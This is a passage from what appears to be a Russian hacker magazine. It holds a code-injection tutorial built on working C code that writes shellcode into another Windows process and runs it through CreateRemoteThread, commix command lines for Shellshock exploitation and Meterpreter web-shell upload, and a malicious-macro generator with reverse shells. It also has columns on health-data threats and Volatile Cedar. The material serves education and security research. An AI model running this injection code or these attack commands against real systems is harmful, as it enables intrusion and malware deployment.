зажимаем Step Over (F8). На этот раз отладка перешагнет через предыдущий
барьер, но упрётся в следующий. Ставим новый breakpoint, перезапускаем
отладку и снова зажимаем Step Over. Так мы повторяем до тех пор, пока не
упрёмся в вызов функции getchar. Этот вызов находится в функции main не-
посредственно перед вызовом функции PrintMessage — как раз то, что нам
и нужно!
  В итоге вызов PrintMessage у меня получился по адресу 0x001613C0.
Само собой, у тебя адреса буду другие и вполне возможны отличия в ассем-
блерном коде. Ассемблерный листинг моей функции PrintMessage приведён
на рисунке 2.

                                                                      Рис. 2. Функция
                                                                    PrintMessage





Давай еще найдем нашу константу default  message. Так как мы уже нашли
функцию main, можно легко выловить адрес константы из кода. Так же легко
можно найти её и в секции: поскольку она является константой, то хранится
в секции.rdata. Чтобы выбрать секцию, жмем Alt + M и ищем.rdata (в столбце
Owner должен быть test). Для поиска по секции можно использовать поиск (Ctrl
+ N). У меня получился адрес 0x001658B8.

                                                                      Рис. 3. Константа
                                                                 в памяти





Листинг самого вызова нашей функции тоже пригодится.

                                                                      Рис. 4. Вызов
                                                             функции
                                                                    PrintMessage


ПИШЕМ ИНЖЕКТОР
Для начала нам нужно найти нужный процесс. Идентификатором процесса
в Windows является его PID (DWORD):

DWORD get_PID (CHAR * PrName)
{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof (PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot (TH32CS_SNAPPROCESS, NULL);
    if (Process32First (snapshot, &entry) == TRUE)
    {
        while (Process32Next (snapshot, &entry) == TRUE)
        {
            // printf ("%s\n", entry.szExeFile);
            if (strcmp (entry.szExeFile, PrName) == 0)
            {
                return entry.th32ProcessID;
            }
        }
    }
    CloseHandle (snapshot);
    return NULL;
}

Функция вытаскивает все активные процессы и сверяет их имена с аргумен-
том. Если нужный процесс нашелся, то она возвращает его PID. А если ты убе-
решь комментарий перед printf, функция выведет тебе все текущие процессы.
   Теперь пишем основную логику для функции main. Наша задача — найти
PID нужного процесса (в нашем случае test.exe) и сохранить его для даль-
нейших действий:

#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
DWORD get_PID (CHAR * PrName);
void main ()
{
    DWORD PID;
    HANDLE hProcess;
    DWORD BaseAddress;
    char * PrName = "test.exe";
    if (! (PID = get_PID (PrName)))
    {
        printf ("Process does not exist\n");
        system ("pause");
        return;
    }
    printf ("Process founded!\n");
    printf ("Process name:%s\n", PrName);
    printf ("PID:%d\n\n", PID);
    system ("pause");
}

Пробуем.

                                                                      Рис. 5.
                                                                  PID процесса



Так, PID мы получили. Теперь нам нужен HANDLE процесса. Дописываем
в main:

if (! (hProcess = OpenProcess (PROCESS_ALL_ACCESS, FALSE, PID)))
{
    printf ("OpenProcess error\n");
    return;
}
printf ("OpenProcess is ok\n");
printf ("Now we have handle of process%s\n", PrName);
printf ("Handle:%d\n\n", hProcess);

Результат получен.

                                                                      Рис. 6.
                                                                    Handle процесса





Пришло время решить первую проблему: ASLR.  Address  space  layout
randomization (ASLR) — это технология, применяемая в операционных систе-
мах, при использовании которой случайным образом изменяется располо-
жение в адресном пространстве процесса важных структур, а именно: обра-
за исполняемого файла, подгружаемых библиотек, кучи и стека (© Wikipedia).
Другими словами, процесс при каждом новом запуске будет располагаться
по разным адресам. Но ведь нам нужно обладать точными адресами внутри
чужого процесса для дальнейших манипуляций! Как же быть?
   Решается это проблема очень просто, с помощью всего одной функции:

DWORD GetModuleBase (char *lpModuleName, DWORD dwProcessId)
{
    MODULEENTRY32 lpModuleEntry = {0};
    HANDLE hSnapShot =
        CreateToolhelp32Snapshot (TH32CS_SNAPMODULE, dwProcessId);
    if (!hSnapShot)
        return NULL;
    lpModuleEntry.dwSize = sizeof (lpModuleEntry);
    BOOL bModule = Module32First (hSnapShot, &lpModuleEntry);
    while (bModule)
    {
        if (!strcmp (lpModuleEntry.szModule, lpModuleName))
        {
            CloseHandle (hSnapShot);
            return (DWORD) lpModuleEntry.modBaseAddr;
        }
        bModule = Module32Next (hSnapShot, &lpModuleEntry);
    }
    CloseHandle (hSnapShot);
    return NULL;
}

Функция принимает в себя PID и имя модуля (если мы работаем с памятью про-
цесса, а не памятью библиотек, которые к нему подключены, имя модуля будет
аналогично имени процесса). На рисунке 7 приведена карта модулей и секций
нашего test.exe (взято из OllyDbg).





Рис. 7. Карта модулей и секций

Дописываем в main наше определение BaseAddress:

if (! (BaseAddress = GetModuleBase (PrName, PID)))
{
    printf ("GetModuleBase error\n");
    return;
}
printf ("GetModuleBase is ok\n");
printf ("BaseAddress:%x\n\n", BaseAddress);



                                                                      Рис. 8.
                                                                 BaseAddress
                                                                 процесса





Теперь нам нужно получить адреса буфера и функции PrintMessage в абсолют-
ном виде. Для этого нам нужны offset (сдвиги) этих двух адресов по адресу
модуля. Например, адрес буфера в OllyDBG равен 0x001658B8. Еще мы зна-
ем, что модуль test.exe в отладчике (см. карту модулей) загрузился по адресу
0x00150000. Вычитаем 0x001658B8–0x00150000 и получаем 0x158B8.
Это и есть offset для буфера. Аналогично высчитываем оффсет для функции
PrintMessage.
   Теперь мы можем суммировать эти оффсеты с BaseAddress-ом и получить
абсолютные адреса в памяти:

DWORD pBuffer = BaseAddress + 0x158B8;
DWORD pfuncPrintMessage = BaseAddress + 0x113C0;

Убедимся, что это те адреса, которые нам нужны. Попробуем вытащить из па-
мяти значение буффера:

printf ("pBuffer:%0.8X\n", pBuffer);
printf ("pfuncPrintMessage:%0.8X\n", pfuncPrintMessage);
char local_buffer [16];
ReadProcessMemory (hProcess, (void*) pBuffer,
                        &local_buffer, sizeof (char) *16, 0);
printf ("Buffer:%s\n\n", local_buffer);

Результат представлен на рисунке 9.

                                                                      Рис. 9.
                                                              Получение значение
                                                               буфера





Отлично, значит, адреса мы нашли верные =) Теперь попробуем вызвать функ-
цию со своими параметрами. Для этого нужно написать небольшой ассем-
блерный код, поместить его в памяти того процесса и передать на него управ-
ление. По сути это небольшой шеллкод, поэтому использовать я буду те же
принципы, что используются в шеллкодинге.
   Шеллкод для вызова функции с нашим параметром представлен на рисунке 10.





Рис. 10. Листинг шеллкода

Байт CC используется здесь для отладки (он является брейпоинтом для от-
ладчика) и в самом шеллкоде не фигурирует. Будь очень внимателен с указа-
телем на стек — если ошибешься в расчетах, в момент возврата из нашего
кода (RETN) программа может передать управление куда угодно. Это вызовет
падение программы, в которую мы инжектимся. Также будь внимателен с со-
глашением о вызовах функций, поскольку разные компиляторы по-разному
вызывают функции. Длина шеллкода задана жестко, поскольку обычные функ-
ции для подсчета длины строки ломаются о нулевые байты.
  И всё-таки наша задача вызвать функцию со своим аргументом, поэтому
продолжаем. Реализуем вызов функции:

HANDLE hProcThread;
DWORD pInjectedFunction = (DWORD) VirtualAllocEx (hProcess, NULL,
            128, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
DWORD local_a = pInjectedFunction + 17;
DWORD local_b = pfuncPrintMessage;
char shellcode [128];
while (1)
{
    strcpy_s (shellcode, "\xBF");
    strcat_s (shellcode, "XXXX");
    strcat_s (shellcode, "\xBB");
    strcat_s (shellcode, "YYYY");
    strcat_s (shellcode, "\x57\xFF\xD3\x83\xC4\x04\xC3");
    printf ("Your text: ");
    fgets (local_buffer, sizeof (local_buffer), stdin);
    strcat_s (shellcode, local_buffer);
    memcpy (shellcode + 1, &local_a, 4);
    memcpy (shellcode + 6, &local_b, 4);
    WriteProcessMemory (hProcess, (LPVOID) pInjectedFunction,
            shellcode, 128, 0);
    hProcThread = CreateRemoteThread (hProcess, NULL, NULL,
            (LPTHREAD_START_ROUTINE) pInjectedFunction,
            NULL, NULL, NULL);
}

Адреса буфера и функции заполняются изначально символами XXXX и YYYY.
Предполагается, что в дальнейшем мы их заменим реальным адресами. Цикл
тут для того, чтобы можно было послать несколько сообщений за один запуск
инжектора. Вся логика построена в генерации шеллкода «на лету»: адреса
берутся из переменных по ходу выполнения программы. Строка, которую мы
передаем в качестве аргумента, хранится после шеллкода, её адрес высчи-
тывается как адрес выделенного участка памяти + длина основной нагрузки
шеллкода.

РЕЗУЛЬТАТ РАБОТЫ
Теперь, когда все готово, пришло время на практике проверить работоспо-
собность. Запускаем подопытную программу, а затем стартуем наш инжектор.
Как видишь, все прекрасно работает.

                                                                      Рис. 11.
                                                            Инжектор





                                                                      Рис. 12.
                                                             Подопытная
                                                               программа





ЗАКЛЮЧЕНИЕ
Пришло время закругляться. Надеюсь, ты понял, что Code Injection — сложный,
но довольно мощный инструмент. Если правильно совмещать техники Code
Injection, DLL Injection и Hooking, можно буквально творить чудеса. Овладев
этими техниками, ты сможешь создавать свои читы, писать ботов и различную
продвинутую малварь (последнее я не рекомендую, потому что это попадает
по 273 статью УК, не забывай про закон) .
   Пожалуй это всё, чем я хотел поделиться в рамках данной статьи. Спасибо
за внимание =)
Взлом





                                 Дмитрий «D1g1» Евдокимов,
                                                                Digital Security
                                               @evdokimovds





СОФТ ДЛЯ ВЗЛОМА И АНАЛИЗА БЕЗОПАСНОСТИ





                         WARNING

                                    Внимание! Информация
                                          представлена
                                     исключительно с целью
                                    ознакомления! Ни авторы,
                                     ни редакция за твои
                                    действия ответственности
                                           не несут!





                COMMIX
                     Commix (сокращение от comm (and    i  (njection
                         ex  (ploiter) — это небольшое, простое окруже-
                      ние на Python, которое может быть использовано
                        веб-разработчиками, пентестерами и исследова-
                       телями безопасности для тестирования веб-при-
                      ложений на наличие багов, ошибок или уязвимо-
                           стей, связанных с атаками класса инъекции команд.
                     Для запуска программы необходим Python строго
                       версий 2.6 или 2.7. Скачиваем commix:
Автор:
Anastasios Stasinopoulos                         # git clone https://github.com/stasinopoulos/
                        commix.git commix
URL:
github.com/stasinopoulos/                    Пример эксплуатации CVE-2014-6271/Shellshock:
commix
                        # python commix.py
Система:                        --url="http://192.168.178.4/cgi-bin/status/"
Linux/Mac/Windows                        --shellshock

                     Больше  примеров  использования  инструмента
                     можно посмотреть здесь.
                       Commix  также  позволяет  сразу  заливать
                      веб-шеллы на целевой хост, например Metasploit
                   PHP Meterpreter, заранее сгенерированный с помо-
                  щью msfvenom:

                        # python commix.py
                        --url="http://192.168.178.4/cmd/
                                 normal.php?addr=INJECT_HERE"
                        --file-write="/root/Desktop/msfvenom.php"
                        --file-dest="/var/www/msfvenom.php"
                        --os-cmd="php -f /var/www/msfvenom.php"

                     Уже  сейчас  инструмент  есть  в  репозиториях
                       для ArchAssault, BlackArch и предустановлен в The
                           Penetration Testers Framework (PTF), PentestBox.




                 IVRE/DRUNK
                     IVRE/DRUNK — это Python-фреймворк для ре-
                        когносцировки сети. Данный инструмент базирует-
                        ся на Nmap/ZMap, Bro и p0f с MongoDB в качестве
                         бэкенда. Как можно увидеть, инструмент поддержи-
                         вает и пассивное, и динамическое сканирование.
                       Что сразу бросается в глаза при работе с данным
                     фреймворком — великолепный информативный
                       веб-интерфейс. Одна из интересных особенно-
                        стей — сразу предоставляется скриншот со скани-
Автор:                      руемой машины без ручного захода на нее. О гибкой
CEA IT Security                      фильтрации по множеству параметров и говорить
                        нечего — все, что надо, предусмотрено.
URL:                           Да, и есть свой Python API, так что можно за-
github.com/cea-sec/ivre                        скриптовать все, что угодно. Или как тебе экспери-
                       ментальная фича по оптическому распознаванию
Система:                      символов? Из скриншотов оставляем только те,
Windows/Linux                        которые, например, содержат слово admin! Так что
                      определенно данный инструмент заслуживает вни-
                        мания.
                       Больше информации об инструменте можно по-
                        черпнуть из блога.
                        Для установки будут необходимы:
                         •  Python 2 (минимум 2.6, включая модули Crypto
                         и pymongo);
                         • Nmap & ZMap;
                         •  Bro & p0f;
                         • MongoDB минимум 2.6;
                         •  веб-сервер (точно работает с Apache или nginx);
                         •  веб-браузер   (точно   работает   с    Firefox
                         и Chromium).




                GENERATE-MACRO
                        Generate-Macro — это PowerShell-скрипт, который
                        генерирует вредоносный документ Microsoft Office
                       с определенной боевой нагрузкой.
                    В техническом плане скрипт генерирует вре-
                      доносный Microsoft Excel с VBA-макросом, выпол-
                   няющим нужные действия. В качестве параметров
                        скрипт запрашивает IP, порт, по которому будет от-
                         кликаться shell, и имя генерируемого файла. Далее
                       выбирается атака и боевая нагрузка.
Автор:                       Из атак скрипт поддерживает:
enigma0x3                              1. Meterpreter Shell c Logon Persistence — выполня-
                             ет VBS-скрипт при входе пользователя в систему.
URL:                             2. Meterpreter Shell c PowerShell Profile Persistence —
github.com/enigma0x3/                          создает зараженный PowerShell-профайл и про-
Generate-Macro                          писывает его в реестр (требует прав локального
                           админа).
Система:                             3. Meterpreter   Shell  с  Alternate  Data  Stream
Windows                              Persistence — создает два альтернативных по-
                            тока для директории AppData, а затем создает
                         ключ в реестре для обработки нашего потока
                         и выполнения функционала.
                             4. Meterpreter Shell с Scheduled Task Persistence —
                          создает scheduled task и выполняет его.
                       Из боевых нагрузок:
                             5. Meterpreter Reverse HTTPS.
                             6. Meterpreter Reverse HTTP.
                       Пример использования:

                        PS> ./Generate-Macro.ps1
                        Enter IP Address: 10.0.0.10
                        Enter Port Number: 1111
                        Enter the name of the document (Do not
                            include a file extension): FinancialData




                   AFL-UTILS
                     Фаззер AFL (American fuzzy lop) все набирает попу-
                        лярность и сообщество вокруг себя, что закономер-
                      но приводит к появлению расширений и улучшений
                       для него от сторонних разработчиков.
                                       Afl-utils — это коллекция инструментов для помо-
                  щи при фаззинге для american fuzzy lop (afl). Он вклю-
                         чает в себя инструменты для решения двух больших
                          задач:
                         •  автоматический сбор, верификацию, повторе-
Автор:                         ние и анализ падений (afl_collect, afl_vcrash);
rc0r                         •  простое управление параллельными (multi-core)
                         задачами при фаззинге (afl_multicore, afl_multikill).
URL:                        Функции инструментов:
github.com/rc0r/afl-utils                         •  afl_collect — собирает все краши в централи-
                         зованном месте для последующего их анализа,
Система:                          а также позволяет запускать для анализа пользо-
Linux                           вательские GDB-скрипты, например exploitable-
                           скрипт для проверки эксплуатации падения и его
                          классификации;
                         •  afl_multicore — запускает параллельно несколь-
                           ко сессий фаззинга в фоне;
                         •   afl_multikill — завершает все afl-fuzz сессии, при-
                        надлежащие afl_multicore сессии;
                         •  afl_vcrash — проверяет, что краши от afl-fuzz при-
                           водят к падению целевого исполняемого файла.




                  DALVIK BYTECODE -> JAVA BYTECODE
                                Enjarify — это инструмент на чистом Python 3 для пе-
                      ревода байт-кода Dalvik в эквивалентный байт-код
                         Java от компании Google. Это позволяет использо-
                         вать инструменты для анализа Java-кода при анали-
                        зе Android-приложений.
                          Запуск чрезвычайно прост:

                        $ python3 -O -m enjarify.main yourapp.apk

Автор:                     А для Windows еще легче (с учетом правильной уста-
Google                        новки скрипта):

URL:                        enjarify yourapp.apk
github.com/google/enjarify
                       У людей, занимающихся анализом Android-прило-
Система:                        жений, наверняка возникает вопрос: в чем отличие
Linux\Windows                          от dex2jar? Да, эти инструменты решают одну и ту
                     же задачу, и в большинстве случаев dex2jar хорош,
                       но не всегда. Есть еще много ситуаций с тонкими
                       и пограничными моментами при переводе, из-за чего
                            dex2jar не справляется или вообще выдает некор-
                        ректный результат. В противовес этому Enjarify пред-
                        назначен для работы во всех каких только возможно
                          ситуациях, даже когда dex2jar будет барахлить.
                       Среди всего этого Enjarify корректно обрабаты-
                         вает Unicode-имена классов, константы, используе-
                    мые во множестве типов, неявное приведение типов,
                       обработчики исключений, прыгающие в нормаль-
                     ный поток управления, классы, которые ссылаются
                       на множество констант, очень длинные имена мето-
                          дов, обработчики исключений после catchall-обра-
                        ботчиков и многое другое.




                  AFL FUZZING CODE COVERAGE
                              Afl-cov — это вспомогательный Python-скрипт для фаз-
                        зера Михала Залевски AFL (American fuzzy lop).
                        Для своей работы afl-cov использует тест-кейс
                     файлы от AFL для генерации gcov результата покры-
                         тия кода целевого исполняемого файла. Покрытие
                       кода интерпретируется от одного тест-кейса к сле-
                    дующему для того, чтобы определить, какие новые
                      функции или ветки кода были затронуты AFL на ка-
                     ждой итерации. В дальнейшем afl-cov позволяет за-
Автор:                         дать строчки кода или функции в файлах покрытия,
Michael Rash                      и потом сделать соответствие тест-кейсам, которые
                         их затронули. Это позволяет пользователю обнару-
URL:                          жить, какой AFL тест-кейс первым затронул ту или
github.com/mrash/afl-cov                      иную функцию. В дополнение к этому afl-cov предо-
                         ставляет zero coverage отчет о функциях и участках
Система:                          кода, которые никогда не были выполнены в про-
Linux                       цессе фаззинга AFL.
                         Ну и как ты, наверное, понимаешь, это в конечном
                         счете помогает улучшить/увеличить покрытие кода
                         в процессе фаззинга, где не справился сам AFL.
                       Из зависимостей скрипта:
                         •   afl-fuzz;
                         •  Python;
                         •  gcov, lcov, genhtml.




                 XXEINJECTOR
                             XXEinjector — инструмент, написанный на Ruby, для ав-
                        томатизации атаки XXE (XML External Entity) различны-
                    ми способами в веб-приложениях, обрабатывающих
                        XML-данные. Сама атака происходит тогда, когда
                       входные XML-данные содержат ссылку на внешнюю
                        сущность (external entity) и XML парсер начинает ее
                        неправильно/небезопасно обрабатывать.
                        Для получения файлов используются как direct,
                           так и out of band (OOB) методы. Листинг директории
Автор:                     применим только для Java-приложений, для осталь-
Jakub Palaczynski                       ных приложений возможен режим bruteforce. Про-
                      грамма отлично работает с протоколами SSL, proxy,
URL:                       HTTP, FTP, gopher. При этом возможна загрузка
github.com/enjoiz/                         jar-файлов и XSLT-инъекции.
XXEinjector                         Также из полезных особенностей можно выде-
                           лить: Base64 encode целевого файла перед отправ-
Система:                           кой, чтобы он не потерялся из-за спецсимволов,
Windows/Linux/Mac                      и перечисление нефильтруемых портов для ре-
                        верс-соединения.
                          Автоматизация эксплуатации XXE с каждым днем
                       все активнее развивается. Тот же Burp недавно по-
                         лучил подобный модуль. Так что, думаю, это не по-
                       следний инструмент с таким функционалом у нас
                        в обзоре. Также для погружения в тему советуем
                      презентацию XML External Entity Attacks.
Malware


Колонка Дениса Макрушина
УГРОЗЫ ДЛЯ СИСТЕМ
ТРЕКИНГА ПОКАЗАТЕЛЕЙ ЗДОРОВЬЯ





                          Денис Макрушин
                             Выпускник факультета информационной безопасности НИЯУ
                         «МИФИ». Специализируется на исследовании угроз. Занимался
                              тестированием на проникновение и аудитом безопасности
                                корпоративных веб-приложений, стресс-тестированием
                            информационных систем на устойчивость к DDoS-атакам,
                          принимал участие в организации и проведении международных
                              мероприятий по проблемам практической безопасности
                                              @difezza, defec.ru@difezza, defec.ru


Как известно, информационная безопасность предпола-
гает целостность, конфиденциальность и доступность ин-
формации. В наше время напичканных электроникой ав-
томобилей, «умных домов» и всевозможных IoT-девайсов
обеспечение безопасности информационной становится
делом обеспечения безопасности жизнедеятельности.





Новые угрозы, на которые, безусловно, нужно обратить внимание, основа-
ны на пока еще не ставшем достаточно популярным, но явно намечающемся
тренде — получать в реальном времени параметры человеческого организ-
ма при помощи мобильных устройств. Наверняка ты знаком с исследованием
безопасности фитнес-браслетов. Одна из ключевых его мыслей следующая:
«Просто представьте — если взломан браслет с датчиком пульса, владелец
магазина может следить за частотой пульса покупателя, пока тот смотрит
на скидки в его магазине. Так же можно узнавать реакцию людей на рекламу.
Более того, взломанный браслет с датчиком пульса можно использовать в ка-
честве детектора лжи».
  С одной стороны, это заявление может показаться слишком пафосным,
ведь представляется сомнительным, что кто-то узнает частоту твоего серд-
цебиения. Но существует и другая сторона. Мобильные телефоны позволя-
ют проводить аналогичные измерения, а они, в отличие от фитнес-браслетов,
есть почти у каждого.

ИСТОРИЯ БОЛЕЗНИ В ТВОЕМ СМАРТФОНЕ
Информацию, полученную в результате трекинга параметров здоровья, мо-
жет по-разному использовать как хозяин устройства, так и производитель
инфраструктуры, на базе которой работает приложение трекинга. Так, пока-
затели сердцебиения могут служить пользователю устройства индикатором
для снижения активности, приема каких-либо препаратов и в других меди-
цинских целях. В свою очередь, вендор может использовать эти параметры
для перепродажи их страховым фирмам. Интересно, как будет зависеть цена
страховки от сердечного приступа, если страховая фирма увидит «шумы»
у потенциального клиента (спокойно, одного только пульса тут недостаточно,
нужен монитор ЭКГ, и то желательно многоканальный. — Прим. ред.). Сцена-
рии подобного использования зависят от фантазии и предприимчивости вла-
дельцев информации.

                                                          Уменьшить
                                                              риск сердечных
                                                             заболеваний
                                                              благодаря
                                                           получению
                                                            своевременной
                                                                      аналитики... Или
                                                               поспособствовать их
                                                             прогрессированию
                                                           при утечке данных


Еще одним, более очевидным, вариантом использования собранных данных
будут медицинские проекты. Компания IBM уже объявила о запуске IBM Watson
Health — проекта, который будет представлять собой специальную экосистему
обработки медицинских данных (также поступающих с мобильных устройств)
для последующего их предоставления в медицинские учреждения. Наша за-
дача как исследователей — проверить, насколько можно доверять health-дан-
ным, аккумулируемым в наших мобильных девайсах.

МОДЕЛЬ УГРОЗ
На основе анализа определенных параметров организма (например, сердце-
биения) внешний нарушитель может определить те или иные симптомы, кото-
рые явно демонстрирует организм жертвы. Имея на руках список болезней,
для которых характерны данные симптомы, злоумышленник может спровоци-
ровать их прогрессирование, вплоть до летального исхода. Соответственно,
задача, которую решает защита информации о параметрах организма вла-
дельца телефона, должна заключаться в обеспечении конфиденциальности,
целостности и доступности (КЦД) собранных данных.
  Для каждого из состояний защищенности можно описать векторы атак.
Причем один и тот же вектор атаки может принадлежать разным типам и, на-
пример, в одних случаях нарушать целостность, а в других конфиденциаль-
ность.
   Варианты атак на конфиденциальность:
•  man-in-the-middle в каналы от сенсора к сервису, аккумулирующему дан-
   ные, и наоборот;
•  несанкционированный доступ к локальному и удаленному хранилищам
   данных.

Варианты атак на целостность:
•  несанкционированный доступ к хранилищам данных;
•  man-in-the-middle в каналы с возможностью подмены передаваемых дан-
   ных (спуфинг);
•  генерация данных (спуфинг) и предоставление их потребителям (сервис-ак-
   кумулятор или приложение).

Атаки на доступность:
•  ransomeware-атаки (шифрование/удаление).

В качестве примера, который продемонстрирует простоту влияния на про-
цедуру получения «health-данных», воспользуемся эмулятором, в котором
«покрутим» ПО, построенное на базе официальных SDK для разработчиков
health-приложений под Android.
  Для анализа защищенности health-данных при их обработке внутри ин-
фраструктуры можно взять на вооружение следующий «рецепт». Для каждой
из платформ (Android, iOS, Windows Phone) берем официальный SDK от разра-
ботчика платформы, предназначенный для получения и обработки health-дан-
ных, и готовим на его основе демонстрационное приложение, которое соби-
рает и обрабатывает эти данные.
  При анализе защищенности следует обращать внимание на каналы пере-
дачи health-данных и их хранилища, а точнее — условия, при которых можно
считать эти каналы и хранилища уязвимыми для перехвата и модификации ин-
формации:
•  наличие шифрования соединения/хранилища (возможность MITM-атак);
•  наличие возможности внедрения в данный канал/хранилище (возможность
   spoofing-атак).

Известно, что существуют эмуляторы мобильных операционных систем и офи-
циальные SDK от разработчиков этих мобильных платформ.
   Ок, Гугл, заходи. Согласно многочисленным исследованиям, наиболее рас-
пространенной на текущий момент мобильной ОС является Android, поэтому
начнем с анализа SDK и health-приложений под данную операционную систему.

                                                                     Главное окно
                                                                приложения
                                                                         Google Fit





После установки мобильного приложения на эмулятор, поддерживающий
эмуляцию сенсора, получится накрутить пару лишних километров для прило-
жений, собирающих статистику активности. Кроме того, используя все ту же
эмуляцию сенсоров, пользователь может подправить те или иные показатели
своей жизнедеятельности и залить их в облако. Зачем? Хотя бы для того, что-
бы в будущем остаться «чистым» для страховых агентств.

«МОЕ СЕРДЦЕ ОСТАНОВИЛОСЬ…»
26 июля 2013 года не стало известного специалиста по информационной без-
опасности Джека Барнаби, который выявил уязвимости в определенной мо-
дели кардиостимуляторов. Обладая необходимыми спецификациями, злоу-
мышленник имел возможность воспользоваться специальным «бэкдором»,
который был оставлен производителем устройств для удаленной связи с де-
вайсами, и вызвать смертельный электрический разряд напряжением 830
В на расстоянии около девяти метров от потенциальной жертвы. У злодея так-
же была возможность перепрограммировать устройство, что, в свою очередь,
означает возможность установки специальной малвари, которая, например,
могла быть подобием программного таймера. Три, два, один, разряд…
   Другой эксперт по информационной безопасности — Билли Райос (Billy Rios)
провел анализ защищенности программного обеспечения инфузионной пом-
пы PCA 3 Lifecare производства Hospira и обнаружил уязвимости, часть из ко-
торых позволяли злоумышленнику увеличить скорость введения лекарств (а
через такие насосы обычно вводятся сильнодействующие средства. — Прим.
ред.) и тем самым спровоцировать передозировку у потенциальной жертвы.
   Что же означают подобные исследования? Медицинские технологии от-
стают в развитии средств обеспечения защиты, а точнее говоря, попросту их
не содержат. При этом от корректного функционирования устройств, постро-
енных на базе данных технологий, зависит жизнь пользователя. И если инфу-
зионные помпы и кардиостимуляторы имеются не у каждого человека, то мо-
бильный телефон, который вежливо собирает всю информацию о показателях
здоровья своего владельца, есть у 99% окружающих нас людей.

А ЧТО ЖЕ ДАЛЬШЕ?
Когда пользователь имитирует свою активность посредством эмуляции сен-
соров, мы имеем дело с вопросом доверия к данным, поступающим от него.
Совсем другой случай, когда уже имеющаяся статистика о показателях здоро-
вья подвергается атакам со стороны третьих лиц. Например, все та же везде-
сущая малварь может, попав на мобильное устройство пользователя, перехва-
тить информацию, поступающую от сенсоров, и передать ее третьим лицам.
Или же зашифровать хранилище со статистическими данными о показателях
здоровья — в данном случае пользователь может лишиться источника анали-
тики для медицинских учреждений...
  С другой стороны, медицинские учреждения довольно консервативны
и не спешат переходить на новые технологии в повседневных процессах, а это
значит, что данные о жизнедеятельности, собранные с мобильных устройств,
еще не скоро станут использоваться в серьезной медицинской практике. Тем
не менее не стоит забывать о существовании недобросовестных лиц, которые
могут воспользоваться данной информацией в других, зачастую трудно пред-
сказуемых случаях.


ОТ РЕДАКТОРА
Трудно спорить с Денисом, эти угрозы есть, и пусть они пока не слишком акту-
альны, мы, разумеется, должны смотреть в будущее, чтобы заранее подгото-
виться к тем вызовам, которые оно нам принесет.
   Однако если трезво посмотреть на качество данных, поступающих от фит-
нес-трекеров, то можно заметить, что они, во-первых, крайне неточные (по-
пробуй прокатиться с шагомером в трамвае или машине и узнай, сколько ты
при этом сжег калорий ;)), а во-вторых, они просто не слишком ценны для пе-
рехвата. Кому может понадобиться твой (измеренный с дикими погрешностя-
ми) пульс? А пусть даже и без погрешностей? Повышение частоты сердечных
сокращений — реакция неспецифическая, и если повышение ЧСС совпадет
у тебя с посещением магазина одежды по данным GPS, то это еще не будет оз-
начать, что ты в восторге от новой коллекции штанов со скидкой. Может быть,
тебя просто выбесил телефонный звонок или лестница в этот самый магазин
показалась твоему истощенному круглосуточным сидением за компьютером
сердцу слишком высокой. Поэтому по-настоящему тебе придется волновать-
ся, только когда твои носимые девайсы будут обладать функцией постоянного
многоканального мониторинга электрокардиограммы. Перехватив их, недо-
брожелатели будут осведомлены о таких неприятных проблемах со здоро-
вьем, как нарушения ритма или ишемическая болезнь сердца.


ВОПРОС ДЕНИСУ
Q: Возможно и легитимно ли в практике наступательной безопасности поль-
зоваться принципом «око за око», то есть намеренно заражать компьютеры
выявленных злоумышленников зловредами с целью контролировать их?
A: Логичный вопрос, который, вероятно, родился у читателя после прочтения
статьи «Наступательная безопасность». Возможно ли? Да, технически воз-
можно. Легитимно ли? Нет.
   Оказаться не только скомпрометированным каким-то киберпреступником,
но и нарушить закон, попытавшись «хакнуть» в ответ, — довольно печальный
сценарий. В развитых в плане информационной безопасности законодатель-
ствах попытка скомпрометировать атакующего незаконна, но всегда существу-
ют исключения даже из этих правил. В том случае, если владелец атакуемого
сервиса имеет какие-либо льготы (например, владелец — некая правитель-
ственная организация), у него имеется возможность собирать информацию
о злоумышленнике, пока тот находится в процессе атаки. Однако даже при этом
использование троянов для заражения злодея будет незаконным.
   Что, если используемый зловред имеет функцию загрузки дополнительных
библиотек? Это означает, что владелец трояна может выполнить произволь-
ный код на стороне жертвы, а это, в свою очередь, значит, что «преступника»
можно сделать из кого угодно. Например, запущенный на стороне злодея тро-
ян подгружает библиотеку, которая сохраняет на диске запрещенный контент
(скажем, видео с детской порнографией), и зараженный киберпреступник уже
проходит по другим статьям, даже в том случае, если инцидент с его участием
не доказан. Так что ответ на данный вопрос однозначен — нет, не легитимно.


Любой умный (или даже не очень) вопрос по информационной безопасности
вообще и малвари в частности можно задать Денису на condifesa@gmail.com.
Malware





                                                                            Александр Лозовский
                                                                                                         lozovsky@glc.ru


  VOLATILE CEDAR
   В ВОПРОСАХ И ОТВЕТАХ





   НОВЫЕ ПОДРОБНОСТИ ИНТЕРЕСНОЙ
 ВОСТОЧНОЙ КАМПАНИИ КИБЕРШПИОНАЖА





В конце марта 2015 года Check Point опубликовала отчет об обнаружении
группы кибершпионажа, получившей название Volatile Cedar. Группа, вероят-
но, происходит из Ливана и связана с его политическим силами. Volatile Cedar
успешно взламывали защиту своих жертв, используя различные методы атак,
в частности вредоносную программу под кодовым названием Explosive. С тех
пор об этой таргетированной атаке появились кое-какие данные, которыми ис-
следователи из подразделения Check Point Malware and Vulnerability Research
Group, проводившие анализ вредоносного кода Volatile Cedar и изучавшие де-
ятельность преступной группы, с удовольствием с нами поделились.

В КАКОМ ГОДУ БЕРЕТ НАЧАЛО ЭТА АТАКА?
Volatile Cedar стартовала еще в 2012 году, и ей удавалось избегать обнаруже-
ния большинством защитных программ в течение целых трех лет. Группа по-
стоянно наблюдает за действиями своих жертв и оперативно реагирует на их
попытки обнаружить заражение.

ЧТО МОЖНО НАЗВАТЬ «ОСНОВНЫМ ОРУЖИЕМ» VOLATILE CEDAR?
Ее основное оружие — Explosive, специально созданная вредоносная троян-
ская программа, которую хакеры внедряют в Сеть и используют для сбора ин-
формации. Для каждой конкретной цели разрабатываются и компилируются
новые специализированные версии программы.

СКОЛЬКО ВЕРСИЙ EXPLOSIVE ИЗВЕСТНО НА ТЕКУЩИЙ МОМЕНТ?
Volatile Cedar постоянно обновляет версии своего вредоносного ПО. На дан-
ный момент известно четыре версии Explosive.
   Первые следы вредоносного ПО этого типа были обнаружены в ноябре 2012
года. Затем появилось еще несколько новых версий. Вероятно, выход обнов-
